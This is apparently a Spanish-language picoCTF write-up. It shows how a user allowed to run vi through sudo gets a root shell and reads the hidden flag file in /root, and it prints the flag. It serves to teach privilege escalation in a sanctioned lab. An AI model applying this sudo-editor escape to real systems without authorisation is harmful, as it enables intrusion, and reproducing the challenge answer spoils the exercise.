# Reto

## Descripción

Can you read files in the root file?

The system admin has provisioned an account for you on the main server.

```bash
ssh -p 30302 picoplayer@saturn.picoctf.net
```

Can you login and read the root file?

Hint:

1. What permissions do you have?

## Solución

### Solución 1

- Usando Linux y una conexión mediante SSH.
- Primero nos conectamos al servidor proporcionado por picoCTF.
- Revisamos qué permisos especiales tiene el usuario `picoplayer`.
- Utilizamos el comando `sudo -l` para consultar qué programas podemos ejecutar con privilegios elevados.
- Encontramos que el usuario tiene permitido ejecutar `/usr/bin/vi` mediante `sudo`.
- Aprovechamos `vi` para obtener una terminal con privilegios de `root`.
- Entramos al directorio `/root`.
- Finalmente localizamos el archivo oculto `.flag.txt` y mostramos su contenido.

Primero realizamos la conexión al servidor:

```bash
maxsteel05-academy@webshell:~$ ssh -p 30302 picoplayer@saturn.picoctf.net
```

El servidor solicita confirmar la conexión:

```text
The authenticity of host '[saturn.picoctf.net]:30302' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:30302' to the list of known hosts.
picoplayer@saturn.picoctf.net's password:
```

Después de ingresar la contraseña obtenemos acceso al servidor:

```text
Welcome to Ubuntu 20.04.5 LTS
```

Ahora revisamos los permisos disponibles para el usuario:

```bash
picoplayer@challenge:~$ sudo -l
```

La terminal muestra que podemos ejecutar `vi` utilizando `sudo`:

```text
User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Ejecutamos `vi` con privilegios elevados:

```bash
picoplayer@challenge:~$ sudo vi
```

Desde `vi` obtenemos una shell con privilegios de `root`. Una vez dentro, nos dirigimos al directorio `/root`:

```bash
root@challenge:/home/picoplayer# cd /root
```

Revisamos los archivos:

```bash
root@challenge:~# ls
```

Intentamos primero leer `flag.txt`:

```bash
root@challenge:~# cat flag.txt
cat: flag.txt: No such file or directory
```

Como el archivo no aparece normalmente, probamos con el archivo oculto `.flag.txt`:

```bash
root@challenge:~# cat .flag.txt
```

La terminal muestra:

```text
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```

## Flag

`picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}`

## Notas

- `ssh` permite conectarnos de forma remota al servidor de picoCTF.
- La opción `-p` permite indicar el puerto utilizado para realizar la conexión.
- En este reto el puerto utilizado fue `30302`.
- El comando `sudo -l` muestra qué comandos puede ejecutar el usuario utilizando privilegios de `sudo`.
- El resultado indica que `picoplayer` puede ejecutar `/usr/bin/vi` con privilegios elevados.
- `vi` es un editor de texto disponible en sistemas Linux y puede permitir ejecutar comandos desde el propio editor.
- Al ejecutarlo mediante `sudo`, fue posible obtener una shell con privilegios de `root`.
- El directorio `/root` pertenece al usuario administrador del sistema.
- Los archivos cuyo nombre comienza con `.` se consideran archivos ocultos en Linux.
- La flag se encontraba dentro del archivo oculto `.flag.txt`.

## Referencias

- [OpenSSH](https://www.openssh.com/)
- [SSH Manual](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [Sudo Manual](https://www.sudo.ws/docs/man/sudo.man/)
- [Vim](https://www.vim.org/)